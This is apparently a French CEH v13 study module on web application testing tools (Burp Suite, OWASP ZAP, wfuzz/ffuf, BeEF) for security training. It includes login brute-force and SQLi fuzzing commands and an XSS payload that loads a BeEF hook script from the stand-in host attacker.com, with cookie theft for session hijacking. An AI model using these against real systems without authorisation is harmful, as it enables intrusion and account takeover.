# 🔴 Module 14 — Outils & Labs : Hacking Web Applications

> **CEH v13 | EC-Council**  
> `#BurpSuite` `#OWASPZAP` `#wfuzz` `#BeEF` `#sqlmap`

---

## 📌 Table des matières

1. [Burp Suite — Outil central](#1-burp-suite)
2. [OWASP ZAP — Alternative open-source](#2-owasp-zap)
3. [wfuzz / ffuf — Fuzzing web](#3-wfuzz--ffuf)
4. [BeEF — Exploitation navigateur](#4-beef)
5. [Workflow de test applicatif complet](#5-workflow-complet)

---

## 1. Burp Suite — Outil Central

Burp Suite est l'outil de référence pour les tests d'applications web au CEH.

### Proxy

```
Configuration :
  Burp : Proxy → Options → 127.0.0.1:8080
  Navigateur : Proxy HTTP = 127.0.0.1:8080

Flux :
  Navigateur → Burp Proxy (intercept) → Serveur
               ↑
          Modifier les requêtes
          en temps réel
```

### Repeater — Rejeu de requêtes

```
Usage : Modifier et renvoyer une requête manuellement

1. Intercepter une requête (ou historique)
2. Clic droit → Send to Repeater
3. Modifier les paramètres (valeur, headers, cookies)
4. Cliquer "Send"
5. Comparer les réponses

Cas d'usage :
- Tester un paramètre pour XSS/SQLi
- Modifier l'ID d'un objet (IDOR)
- Tester différentes valeurs de token JWT
```

### Intruder — Attaques automatisées

```
Modes d'attaque :
  Sniper       : 1 position, 1 wordlist
  Battering ram: toutes les positions, même valeur
  Pitchfork    : N positions, N wordlists parallèles
  Cluster bomb : N positions, toutes les combinaisons

Cas d'usage :
  Brute force login :
    POST /login  user=§admin§&pass=§§
    Wordlist utilisateurs + mots de passe
    → Comparer tailles de réponses ou codes HTTP

  Fuzzing de paramètres SQLi :
    GET /search?q=§test§
    Wordlist : SQLi payloads (from SecLists)
    → Identifier les erreurs SQL dans les réponses
```

### Scanner (Pro)

```
Usage : Scanner automatiquement les vulnérabilités
→ Détecte : XSS, SQLi, CSRF manquant, headers sécurité, etc.

Version Community : scan actif limité mais fonctionnalités de base disponibles
```

### Decoder

```
Encoder/décoder rapidement des valeurs :
- URL encode/decode
- Base64 encode/decode
- HTML encode
- Hex
→ Utile pour créer des payloads ou analyser des tokens
```

---

## 2. OWASP ZAP — Alternative Open-Source

```
Fonctionnalités principales :
- Proxy intercept (comme Burp)
- Spider (crawler automatique)
- Scanner actif (CVEs, XSS, SQLi...)
- Fuzzer
- WebSockets support

Démarrage :
zap.sh -daemon -host 0.0.0.0 -port 8090
# ou lancer l'interface graphique

Spider automatique :
  URL : http://target.com
  Spider → Start Scan
  → Découvrir automatiquement toutes les URLs

Scanner actif :
  Click droit sur l'URL → Attack → Active Scan
  → Lance des tests sur toutes les URLs découvertes

Alertes typiques :
  XSS (reflected)
  SQL Injection
  Missing security headers
  Insecure cookie flags
```

---

## 3. wfuzz / ffuf — Fuzzing Web

```bash
# ─── WFUZZ ────────────────────────────────────────────────────
# Fuzzing de répertoires :
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
  --hc 404 http://target.com/FUZZ

# Fuzzing de paramètres :
wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt \
  http://target.com/search?q=FUZZ

# Brute force login :
wfuzz -c -z file,users.txt -z file,passwords.txt \
  --hs "Invalid credentials" \
  -d "user=FUZZ&pass=FUZ2Z" \
  http://target.com/login

# ─── FFUF ─────────────────────────────────────────────────────
# Fuzzing de chemins :
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/big.txt -mc 200,301

# Fuzzing de paramètres GET :
ffuf -u "http://target.com/page?FUZZ=value" -w params.txt -mc 200

# Fuzzing avec filtres :
ffuf -u http://target.com/FUZZ -w wordlist.txt \
  -mc 200 \            # Codes de réponse
  -ms 1000 \           # Taille de réponse
  -fw 10               # Nombre de mots dans la réponse
```

---

## 4. BeEF — Browser Exploitation Framework

```
Architecture :
  [Attaquant]              [Victime]
  BeEF Panel ──WS/HTTP──▶ Navigateur hooké via XSS

Payload XSS pour hocker un navigateur :
<script src="http://attacker.com:3000/hook.js"></script>

Une fois hooké, dans l'interface BeEF :
  Modules disponibles :
  ├── Browser : Fingerprinting, user-agent, plugins
  ├── Network : Scan réseau interne via victime
  ├── Rider : Forger des requêtes HTTP avec ses cookies
  ├── Social Engineering : Faux dialogs, phishing
  ├── Persistence : Maintenir le hook même après navigation
  └── Misc : Keylogger, capture screenshot, webcam
  
Exemple d'exfiltration de cookies :
  Module → Browser → Cookie Theft
  → Récupère document.cookie
  → Utiliser dans Burp Suite pour hijacking de session
```

---

## 5. Workflow de Test Applicatif Complet

```
PHASE 1 : MAPPING
  1. Spider avec OWASP ZAP ou Burp Spider
     → Découvrir toutes les URLs, formulaires, endpoints API
  
  2. Identifier les fonctionnalités clés :
     → Authentification, panier, admin, API endpoints
     
  3. Lire robots.txt, sitemap.xml, .git si exposé

PHASE 2 : AUTHENTIFICATION ET SESSIONS
  4. Tester la robustesse du mécanisme de login :
     → Brute force protection (Burp Intruder)
     → Credentials par défaut (admin/admin, test/test)
     → Response differences (username enumeration)
  
  5. Analyser les cookies et tokens :
     → Flags (Secure, HttpOnly, SameSite) via Burp
     → Entropie du Session ID (prévisible ?)
     → JWT : decoder avec jwt.io, tester alg:none

PHASE 3 : INJECTION
  6. Identifier les points d'entrée :
     → Tous les paramètres GET/POST, headers, cookies
  
  7. Tester SQLi (manuel + sqlmap)
  
  8. Tester XSS :
     → Reflected : dans chaque paramètre
     → Stored : dans tous les champs de saisie

PHASE 4 : CONTRÔLES D'ACCÈS
  9. Tester les accès non autorisés (IDOR) :
     → Modifier les IDs d'objets
     → Tenter des opérations admin sans être admin
  
  10. Tester le CSRF :
      → Générer un PoC dans Burp Suite

PHASE 5 : DOCUMENTATION
  11. Documenter chaque finding :
      → Preuve (requête/réponse)
      → Reproduction step-by-step
      → Impact (CVSS score)
      → Recommandation de remédiation
```

---

## 🧠 Points clés à retenir pour l'examen

- **Burp Suite** = outil central pour les tests web CEH
- **Proxy** = intercept et modifie les requêtes en temps réel
- **Repeater** = rejouer et modifier des requêtes manuellement
- **Intruder** = attaques brute force et fuzzing automatisé
- **OWASP ZAP** = alternative open-source à Burp (scan automatique)
- **BeEF** = hook navigateur via XSS, exfiltration cookies
- **wfuzz/ffuf** = fuzzing de paramètres et répertoires

---

*⬅️ [Techniques d'attaques](./03_techniques_attaques.md) | ➡️ [Contre-mesures](./05_contre-mesures.md)*
